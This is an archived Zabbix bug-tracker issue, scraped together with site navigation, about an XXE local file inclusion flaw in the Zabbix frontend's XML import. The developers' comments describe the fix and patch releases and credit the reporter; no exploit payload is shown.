## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from web.archive.org_6f9c0f97_20250126_110519.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[35 captures](/web/20140726222837%2A/https%3A//support.zabbix.com/browse/ZBX-8151 "See a list of every capture for this URL")
26 Jul 2014 - 02 Nov 2024

| Jun | JUL | [**Oct**](https://web.archive.org/web/20151017210326/https%3A//support.zabbix.com/browse/ZBX-8151 "17 Oct 2015") |
| Previous capture | 26 | [Next capture](https://web.archive.org/web/20151017210326/https%3A//support.zabbix.com/browse/ZBX-8151 "21:03:26 Oct 17, 2015") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20151017210326/https%3A//support.zabbix.com/browse/ZBX-8151 "17 Oct 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Internet Archive](https://archive.org/details/NO404)

These crawls are part of an effort to archive pages as they are created and archive the pages that they refer to. That way, as the pages that are referenced are changed or taken from the web, a link to the version that was live when the page was written will be preserved.

Then the Internet Archive hopes that references to these archived pages will be put in place of a link that would be otherwise be broken, or a companion link to allow people to see what was originally intended by a page's authors.

The goal is to [fix all broken links on the web](https://blog.archive.org/2013/10/25/fixing-broken-links/).
Crawls of supported "No More 404" sites.

Collection: [Wikipedia Near Real Time (from IRC)](https://archive.org/details/NO404-WKP)

This is a collection of web page captures from links added to, or changed on, Wikipedia pages. The idea is to bring a reliability to Wikipedia outlinks so that if the pages referenced by Wikipedia articles are changed, or go away, a reader can permanently find what was originally referred to.

This is part of the Internet Archive's attempt to [rid the web of broken links](https://blog.archive.org/2013/10/25/fixing-broken-links/).

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140726222837/https://support.zabbix.com/browse/ZBX-8151

[![ZABBIX SUPPORT](/web/20140726222837im_/https://support.zabbix.com/s/en_US6dz22d/665/4/_/images/zabbix1.png)](/web/20140726222837/https%3A//support.zabbix.com/secure/Dashboard.jspa)
Quick Search

[Log In](/web/20140726222837/https%3A//support.zabbix.com/login.jsp?os_destination=%2Fbrowse%2FZBX-8151)
Access more options

* [Online Help](https://web.archive.org/web/20140726222837/http%3A//docs.atlassian.com/jira/docs-044/JIRA%2BDocumentation "Goto the online documentation for JIRA")
* [Keyboard Shortcuts](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about JIRA's Keyboard Shortcuts")
* [About JIRA](https://web.archive.org/web/20140726222837/http%3A//www.atlassian.com/software/jira "Get more information about JIRA")
* [JIRA Credits](/web/20140726222837/https%3A//support.zabbix.com/secure/JiraCreditsPage%21default.jspa "See who did what")

* [Dashboards](/web/20140726222837/https%3A//support.zabbix.com/secure/Dashboard.jspa "View your current Dashboard")
  Access more options (Alt+d)
* [Projects](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX "Browse currently active project 'ZABBIX BUGS AND ISSUES'")
  Access more options (Alt+p)
* [Issues](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa "View your current filter")
  Access more options (Alt+i)

# ZABBIX BUGS AND ISSUES

* [ZABBIX BUGS AND ISSUES](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX)
* [ZBX-8151](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151)

## [Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151)

* [Log In](/web/20140726222837/https%3A//support.zabbix.com/login.jsp?os_destination=%2Fbrowse%2FZBX-8151)

* Views
  + [XML](/web/20140726222837/https%3A//support.zabbix.com/si/jira.issueviews%3Aissue-xml/ZBX-8151/ZBX-8151.xml)
  + [Word](/web/20140726222837/https%3A//support.zabbix.com/si/jira.issueviews%3Aissue-word/ZBX-8151/ZBX-8151.doc)
  + [Printable](/web/20140726222837/https%3A//support.zabbix.com/si/jira.issueviews%3Aissue-html/ZBX-8151/ZBX-8151.html)

### Details

* **Type:**
  ![Bug](/web/20140726222837im_/https://support.zabbix.com/images/icons/bug.gif "Bug - A problem which impairs or prevents the functions of the product.")
  Bug
* **Status:**
  ![Closed](/web/20140726222837im_/https://support.zabbix.com/images/icons/status_closed.gif "Closed - The issue is considered finished, the resolution is correct. Issues which are closed can be reopened.")
  Closed
* **Priority:**
  ![Critical](/web/20140726222837im_/https://support.zabbix.com/images/icons/priority_critical.gif "Critical - Crashes, loss of data, severe memory leak.")
  Critical
* **Resolution:**
  Fixed
* **Affects Version/s:**
  1.8.19, 1.8.20, 2.0.9, 2.0.10, 2.0.11rc2, 2.0.11, 2.2.2, 2.2.3rc1, 2.2.3rc2, 2.2.3
* **Fix Version/s:**
  [1.8.21rc1](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/fixforversion/12109 "1.8.21rc1 "), [2.0.13rc1](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/fixforversion/12305 "2.0.13rc1 "), [2.2.5rc1](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/fixforversion/12312 "2.2.5rc1 "), [2.3.2](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/fixforversion/12310 "2.3.2 ")
* **Component/s:**
  [API (A)](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/component/10090 "API (A) Issues related to JSON-RPC API."), [Frontend (F)](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX/component/10000 "Frontend (F) Zabbix web-based user interface")
* **Labels:**
  + [frontend](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa?reset=true&jqlQuery=labels+%3D+frontend "frontend")
  + [import](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa?reset=true&jqlQuery=labels+%3D+import "import")
  + [security](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa?reset=true&jqlQuery=labels+%3D+security "security")
  + [vulnerability](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa?reset=true&jqlQuery=labels+%3D+vulnerability "vulnerability")
  + [xxe](/web/20140726222837/https%3A//support.zabbix.com/secure/IssueNavigator.jspa?reset=true&jqlQuery=labels+%3D+xxe "xxe")
* **Environment:**
  CentOS 6.5 x84

* **Zabbix ID:**
  NA

### Description

zabbix frontend support xml data import feature,and server-side use DOMDocument to parse xml.DOMDocument also parse the external dtd in default.So attacker can use a crafted xml to read arbitrary local file and send http request use zabbix server as a proxy.

* More Options
  + [Sort By Name](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?attachmentSortBy=fileName#attachmentmodule "Sort By Name")
  + [Sort By Date](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?attachmentOrder=desc#attachmentmodule "Descending")
  + [Download All](/web/20140726222837/https%3A//support.zabbix.com/secure/attachmentzip/28311.zip "Download all attachments as a ZIP file")

### Attachments

1. [![Text File](/web/20140726222837im_/https://support.zabbix.com/images/icons/attach/text.gif)](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/28912/ZBX_8151_2_2_2.patch)

   [ZBX\_8151\_2\_2\_2.patch](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/28912/ZBX_8151_2_2_2.patch "Latest 2014 Jun 20 14:55 - Andrejs Čirkovs")

   2014 Jun 20 14:55
   2 kB
   Andrejs Čirkovs

1. [![](/web/20140726222837im_/https://support.zabbix.com/secure/thumbnail/27872/_thumb_27872.png)](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/27872/poc_screenshot_01.jpg "poc_screenshot_01.jpg - Latest 2014 Apr 25 14:17 - pnig0s")

   [poc\_screenshot\_01.jpg](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/27872/poc_screenshot_01.jpg "poc_screenshot_01.jpg - Latest 2014 Apr 25 14:17 - pnig0s")
   46 kB
   2014 Apr 25 14:17
2. [![](/web/20140726222837im_/https://support.zabbix.com/secure/thumbnail/27873/_thumb_27873.png)](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/27873/poc_screenshot_02.jpg "poc_screenshot_02.jpg - Latest 2014 Apr 25 14:18 - pnig0s")

   [poc\_screenshot\_02.jpg](/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/27873/poc_screenshot_02.jpg "poc_screenshot_02.jpg - Latest 2014 Apr 25 14:18 - pnig0s")
   55 kB
   2014 Apr 25 14:18

### Activity

[Ascending order - Click to sort in descending order](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?actionOrder=desc#issue-tabs "Ascending order - Click to sort in descending order")

* [**All**](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?page=com.atlassian.jira.plugin.system.issuetabpanels:all-tabpanel#issue-tabs)
* **Comments**
* [**History**](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?page=com.atlassian.jira.plugin.system.issuetabpanels:changehistory-tabpanel#issue-tabs)
* [**Activity**](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?page=com.atlassian.streams.streams-jira-plugin:activity-stream-issue-tab#issue-tabs)

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113283&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113283 "A permanent link to this comment.")

[pnig0s](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=pnig0s)
added a comment - 2014 Jun 14 07:20

Still no fix release for this?

Show
[pnig0s](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=pnig0s)
added a comment - 2014 Jun 14 07:20 Still no fix release for this?

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113371&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113371 "A permanent link to this comment.")

[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 16 12:01

Can you please provide details about the system hosting Zabbix (os version, php version, libml version)? It seems that this vulnerability affects only systems that have DTDLOAD libxml flag set (obsolete redhat's, mostly) and can not be fixed on zabbix level (please note that forcing libxml to load external DTD by default is a major security hole itself).

Show
[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 16 12:01 Can you please provide details about the system hosting Zabbix (os version, php version, libml version)? It seems that this vulnerability affects only systems that have DTDLOAD libxml flag set (obsolete redhat's, mostly) and can not be fixed on zabbix level (please note that forcing libxml to load external DTD by default is a major security hole itself).

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113387&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113387 "A permanent link to this comment.")

[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 16 13:19

An update from Andrejs:

> UPD: we CAN siable this behaiviour by calling [http://lv1.php.net/manual/en/function.libxml-disable-entity-loader.php](https://web.archive.org/web/20140726222837/http%3A//lv1.php.net/manual/en/function.libxml-disable-entity-loader.php) libxml\_disable\_entity\_loader(true); just before simplexml\_load\_file

Show
[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 16 13:19 An update from Andrejs:
> UPD: we CAN siable this behaiviour by calling [http://lv1.php.net/manual/en/function.libxml-disable-entity-loader.php](https://web.archive.org/web/20140726222837/http%3A//lv1.php.net/manual/en/function.libxml-disable-entity-loader.php) libxml\_disable\_entity\_loader(true); just before simplexml\_load\_file

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113405&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113405 "A permanent link to this comment.")

[pnig0s](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=pnig0s)
added a comment - 2014 Jun 16 14:21

Yes,you can use libxml\_disable\_entity\_loader(true); to disable the entity parsing or just throw an error when come cross a DTD tag.I use ubuntu10.04 libxml2.6.The newest version of libxml has fixed this problem,but there are a lot of vulnerable host in the wild.

Show
[pnig0s](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=pnig0s)
added a comment - 2014 Jun 16 14:21 Yes,you can use libxml\_disable\_entity\_loader(true); to disable the entity parsing or just throw an error when come cross a DTD tag.I use ubuntu10.04 libxml2.6.The newest version of libxml has fixed this problem,but there are a lot of vulnerable host in the wild.

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113599&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113599 "A permanent link to this comment.")

[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 17 15:54 - edited

RESOLVED

fixed in development branch svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8

fixed in development branch svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

Show
[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 17 15:54 - edited RESOLVED
fixed in development branch svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8
fixed in development branch svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113686&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113686 "A permanent link to this comment.")

[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 18 12:59 - edited

(1) Please add a comment why the LIBXML\_IMPORT\_FLAGS constant is required. Otherwise good.

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) CLOSED

Show
[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 18 12:59 - edited (1) Please add a comment why the LIBXML\_IMPORT\_FLAGS constant is required. Otherwise good.
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) CLOSED

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113687&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113687 "A permanent link to this comment.")

[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 18 12:59 - edited

TESTED.

Please take care of (1) before merging.

Show
[Pavels Jelisejevs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=jelisejev)
added a comment - 2014 Jun 18 12:59 - edited TESTED.
Please take care of (1) before merging.

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=113718&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-113718 "A permanent link to this comment.")

[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 18 16:35

Waiting for 2.2 to unfreeze before merge (as for June 18 2014).

Show
[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 18 16:35 Waiting for 2.2 to unfreeze before merge (as for June 18 2014).

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114030&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114030 "A permanent link to this comment.")

[Ingus Vilnis](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=ingus.vilnis)
added a comment - 2014 Jun 20 14:34 - edited

(2) Please create a patch for customer using 2.2.2 frontend.

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) please see [https://support.zabbix.com/secure/attachment/28912/ZBX\_8151\_2\_2\_2.patch](https://web.archive.org/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/28912/ZBX_8151_2_2_2.patch) attached, apply with:

```
patch -p0 -i ZBX_8151_2_2_2.patch
```

from Zabbix root. Should also work on other 2.0 / 2.2 branches.

RESOLVED.

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Ingus Vilnis](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=ingus.vilnis) CLOSED. May be reopened because the customer has not confirmed the patch yet (as of June 26).

Show
[Ingus Vilnis](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=ingus.vilnis)
added a comment - 2014 Jun 20 14:34 - edited (2) Please create a patch for customer using 2.2.2 frontend.
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) please see [https://support.zabbix.com/secure/attachment/28912/ZBX\_8151\_2\_2\_2.patch](https://web.archive.org/web/20140726222837/https%3A//support.zabbix.com/secure/attachment/28912/ZBX_8151_2_2_2.patch) attached, apply with:
```
patch -p0 -i ZBX_8151_2_2_2.patch
```

from Zabbix root. Should also work on other 2.0 / 2.2 branches.
RESOLVED.
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Ingus Vilnis](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=ingus.vilnis) CLOSED. May be reopened because the customer has not confirmed the patch yet (as of June 26).

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114034&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114034 "A permanent link to this comment.")

[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 20 14:55

Patch for 2.2.2 (should work on any 2.0 / 2.2).

Show
[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 20 14:55 Patch for 2.2.2 (should work on any 2.0 / 2.2).

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114314&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114314 "A permanent link to this comment.")

[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 25 11:58

Closed in pre-1.8.21rc1 r46795, pre-2.0.13rc1 r46796, pre-2.2.5rc1 r46797, pre-2.3.2 r46799.

Show
[Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch)
added a comment - 2014 Jun 25 11:58 Closed in pre-1.8.21rc1 r46795, pre-2.0.13rc1 r46796, pre-2.2.5rc1 r46797, pre-2.3.2 r46799.

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114400&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114400 "A permanent link to this comment.")

[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:05 - edited

subissues (1) and (2) still not closed

Show
[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:05 - edited subissues (1) and (2) still not closed

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114401&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114401 "A permanent link to this comment.")

[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:06 - edited

(3) changelog entry only has F component marked - didn't this fix affect the api in some way, too ? (configuration.import or anything else)

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) RESOLVED, corrected changelogs

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv) note that more recent changelogs have sections for older releases - apparently those have not been updated

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) Must be fixed by now ![](/web/20140726222837im_/https://support.zabbix.com/images/icons/emoticons/smile.gif)

<[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)> thanks, looks good to me -> CLOSED

Show
[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:06 - edited (3) changelog entry only has F component marked - didn't this fix affect the api in some way, too ? (configuration.import or anything else)
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) RESOLVED, corrected changelogs
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv) note that more recent changelogs have sections for older releases - apparently those have not been updated
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) Must be fixed by now ![](/web/20140726222837im_/https://support.zabbix.com/images/icons/emoticons/smile.gif)
<[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)> thanks, looks good to me -> CLOSED

Hide
[Permalink](/web/20140726222837/https%3A//support.zabbix.com/browse/ZBX-8151?focusedCommentId=114402&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-114402 "A permanent link to this comment.")

[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:10 - edited

(4) it's a common practice to mention reporters for security issues - in this case let's add in the changelog entry "; thanks to pnig0s@Freebuf for the report"

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) RESOLVED, updated changelogs

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv) note that more recent changelogs have sections for older releases - apparently those have not been updated

[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) Must be fixed by now ![](/web/20140726222837im_/https://support.zabbix.com/images/icons/emoticons/smile.gif)

<[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)> thanks, looks good to me -> CLOSED

Show
[richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)
added a comment - 2014 Jun 25 22:10 - edited (4) it's a common practice to mention reporters for security issues - in this case let's add in the changelog entry "; thanks to pnig0s@Freebuf for the report"
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) RESOLVED, updated changelogs
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv) note that more recent changelogs have sections for older releases - apparently those have not been updated
[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)Andrejs Čirkovs](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=andrewtch) Must be fixed by now ![](/web/20140726222837im_/https://support.zabbix.com/images/icons/emoticons/smile.gif)
<[![](/web/20140726222837im_/https://support.zabbix.com/images/icons/user_12.gif)richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)> thanks, looks good to me -> CLOSED

### People

* Assignee:
  [richlv](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=richlv)

  Reporter:
  [pnig0s](/web/20140726222837/https%3A//support.zabbix.com/secure/ViewProfile.jspa?name=pnig0s)

Vote
(0)

Watch
(3)

### Dates

* Created:
  2014 Apr 25 14:11

  Updated:
  2014 Jun 27 13:49

  Resolved:
  2014 Jun 26 13:39

[Atlassian JIRA](https://web.archive.org/web/20140726222837/http%3A//www.atlassian.com/software/jira)
(v4.4.5#665-sha1:422aead)
| [Report a problem](https://web.archive.org/web/20140726222837/http%3A//support.atlassian.com/secure/CreateIssue.jspa?issuetype=1&pid=10000)

Powered by a free Atlassian [JIRA](https://web.archive.org/web/20140726222837/http%3A//www.atlassian.com/software/jira) open source license for ZABBIX . Try JIRA - [bug tracking software](https://web.archive.org/web/20140726222837/http%3A//www.atlassian.com/software/jira) for *your* team.



=== Content from support.zabbix.com_e221bd8d_20250126_110510.html ===


[Log in](/login.jsp?os_destination=%2Fbrowse%2FZBX-8151)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoading…[![ZABBIX SUPPORT](/s/-uhzoog/9120004/14o1foa/_/jira-logo-scaled.png)](https://support.zabbix.com/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* [Help](https://docs.atlassian.com/jira/jcore-docs-0912/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-0912/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FZBX-8151)

![Uploaded image for project: 'ZABBIX BUGS AND ISSUES'](https://support.zabbix.com/secure/projectavatar?pid=10000&avatarId=20377)

1. [ZABBIX BUGS AND ISSUES](/browse/ZBX)
2. [ZBX-8151](/browse/ZBX-8151)

## Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

[Log In](/login.jsp?os_destination=%2Fbrowse%2FZBX-8151 "Log In")ClosedExportnullXMLWordPrintable
### Details

* **Type:**
  ![Icon: Defect (Security)](/secure/viewavatar?size=xsmall&avatarId=21772&avatarType=issuetype "Defect (Security) - Discovered security vulnerabilities in Zabbix") Defect (Security)
* **Resolution:**
  Fixed
* **Priority:**
  ![Icon: Critical](/images/icons/priorities/critical.svg "Critical - Crashes, loss of data, severe memory leak.") Critical
* **Fix Version/s:**
  [1.8.21rc1](/issues/?jql=project+%3D+ZBX+AND+fixVersion+%3D+1.8.21rc1 "1.8.21rc1 "), [2.0.13rc1](/issues/?jql=project+%3D+ZBX+AND+fixVersion+%3D+2.0.13rc1 "2.0.13rc1 "), [2.2.5rc1](/issues/?jql=project+%3D+ZBX+AND+fixVersion+%3D+2.2.5rc1 "2.2.5rc1 "), [2.3.2](/issues/?jql=project+%3D+ZBX+AND+fixVersion+%3D+2.3.2 "2.3.2 ")
* **Affects Version/s:**
  1.8.19, 1.8.20, 2.0.9, 2.0.10, 2.0.11rc2, 2.0.11, 2.2.2, 2.2.3rc1, 2.2.3rc2, 2.2.3
* **Component/s:**
